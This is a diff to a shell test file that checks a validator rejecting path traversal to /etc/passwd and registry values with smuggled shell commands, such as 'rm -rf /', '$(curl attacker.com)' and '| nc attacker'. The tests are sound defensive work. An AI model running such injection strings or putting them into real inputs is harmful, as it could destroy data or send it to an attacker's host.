@@ -39,19 +39,19 @@ teardown() { common_teardown; }
 @test "'../../../etc/passwd' refused per + T" {
   run bash -c "source '$CANON' && gaia_distribution_canonicalize_manifest '$PROJECT_ROOT' '../../../etc/passwd'"
   [ "$status" -ne 0 ]
-  echo "$output" | grep -qE 'SR-79|T-DCH-1|outside project root|traversal'
+  grep -qE 'SR-79|T-DCH-1|outside project root|traversal' <<<"$output"
 }
 
 @test "'foo/../../../etc/passwd' refused (deeper traversal)" {
   run bash -c "source '$CANON' && gaia_distribution_canonicalize_manifest '$PROJECT_ROOT' 'foo/../../../etc/passwd'"
   [ "$status" -ne 0 ]
-  echo "$output" | grep -qE 'SR-79|outside project root|traversal'
+  grep -qE 'SR-79|outside project root|traversal' <<<"$output"
 }
 
 @test "absolute path outside project '/etc/passwd' refused" {
   run bash -c "source '$CANON' && gaia_distribution_canonicalize_manifest '$PROJECT_ROOT' '/etc/passwd'"
   [ "$status" -ne 0 ]
-  echo "$output" | grep -qE 'SR-79|absolute|traversal'
+  grep -qE 'SR-79|absolute|traversal' <<<"$output"
 }
 
 # ---------- TC-DCH-10: shell-metacharacter denylist ----------
@@ -59,31 +59,31 @@ teardown() { common_teardown; }
 @test "registry with ';' refused per denylist" {
   run bash -c "source '$CANON' && gaia_distribution_validate_string 'https://evil.com; rm -rf /'"
   [ "$status" -ne 0 ]
-  echo "$output" | grep -qE 'SR-80|T-DCH-2|shell.*metachar'
+  grep -qE 'SR-80|T-DCH-2|shell.*metachar' <<<"$output"
 }
 
 @test "registry with '\$' refused per denylist" {
   run bash -c "source '$CANON' && gaia_distribution_validate_string 'https://evil.com\$(curl attacker.com)'"
   [ "$status" -ne 0 ]
-  echo "$output" | grep -qE 'SR-80|T-DCH-2|shell'
+  grep -qE 'SR-80|T-DCH-2|shell' <<<"$output"
 }
 
 @test "registry with backtick refused" {
   run bash -c "source '$CANON' && gaia_distribution_validate_string 'https://evil.com\`whoami\`'"
   [ "$status" -ne 0 ]
-  echo "$output" | grep -qE 'SR-80|T-DCH-2|shell'
+  grep -qE 'SR-80|T-DCH-2|shell' <<<"$output"
 }
 
 @test "registry with '&&' refused" {
   run bash -c "source '$CANON' && gaia_distribution_validate_string 'https://evil.com && rm'"
   [ "$status" -ne 0 ]
-  echo "$output" | grep -qE 'SR-80|T-DCH-2|shell'
+  grep -qE 'SR-80|T-DCH-2|shell' <<<"$output"
 }
 
 @test "registry with '|' refused" {
   run bash -c "source '$CANON' && gaia_distribution_validate_string 'https://evil.com | nc attacker'"
   [ "$status" -ne 0 ]
-  echo "$output" | grep -qE 'SR-80|T-DCH-2|shell'
+  grep -qE 'SR-80|T-DCH-2|shell' <<<"$output"
 }
 
 @test "clean registry value passes" {
@@ -96,13 +96,13 @@ teardown() { common_teardown; }
 @test "'not-a-url' refused per URL-shape" {
   run bash -c "source '$CANON' && gaia_distribution_validate_url 'not-a-url'"
   [ "$status" -ne 0 ]
-  echo "$output" | grep -qE 'SR-80|URL.*shape|T-DCH-2'
+  grep -qE 'SR-80|URL.*shape|T-DCH-2' <<<"$output"
 }
 
 @test "'http://insecure.com' refused (https only)" {
   run bash -c "source '$CANON' && gaia_distribution_validate_url 'http://insecure.com'"
   [ "$status" -ne 0 ]
-  echo "$output" | grep -qE 'SR-80|https'
+  grep -qE 'SR-80|https' <<<"$output"
 }
 
 @test "'https://registry.npmjs.org' passes" {
@@ -118,7 +118,7 @@ teardown() { common_teardown; }
 @test "registry validator catches shell-metachar even when URL-shape would also fail" {
   run bash -c "source '$CANON' && gaia_distribution_validate_url 'https://evil.com; rm'"
   [ "$status" -ne 0 ]
-  echo "$output" | grep -qE 'SR-80|shell'
+  grep -qE 'SR-80|shell' <<<"$output"
 }
 
 # ---------- AC3: '..' segments refused pre-canonicalization ----------
@@ -126,7 +126,7 @@ teardown() { common_teardown; }
 @test "'..' segment in manifest refused pre-canonicalization with T- cite" {
   run bash -c "source '$CANON' && gaia_distribution_canonicalize_manifest '$PROJECT_ROOT' 'foo/../plugin.json'"
   [ "$status" -ne 0 ]
-  echo "$output" | grep -qE 'T-DCH-1|SR-79|traversal'
+  grep -qE 'T-DCH-1|SR-79|traversal' <<<"$output"
 }
 
 # ---------- Source-guard ----------
